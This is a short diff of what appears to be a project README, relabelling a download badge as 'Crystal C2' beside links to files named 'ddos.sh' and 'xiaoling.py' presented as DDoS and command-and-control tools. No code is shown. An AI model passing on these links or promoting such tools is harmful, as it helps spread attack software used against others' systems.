@@ -133,7 +133,7 @@ python main.py
 
 <p align="center">
   <a href="https://www.mediafire.com/file/u7wjz038ng62ppr/ddos.sh/file">
-    <img src="https://img.shields.io/badge/Crystal-Mediafire-blue?logo=mediafire&logoColor=white&style=for-the-badge" alt="Crystal">
+    <img src="https://img.shields.io/badge/Crystal-Mediafire-blue?logo=mediafire&logoColor=white&style=for-the-badge" alt="Crystal C2">
   </a>
   <a href="https://www.mediafire.com/file/mf4h1sui1jcbxpx/xiaoling.py/file">
     <img src="https://img.shields.io/badge/Xiaoling%20C2-Mediafire-blue?logo=mediafire&logoColor=white&style=for-the-badge" alt="Xiaoling C2">
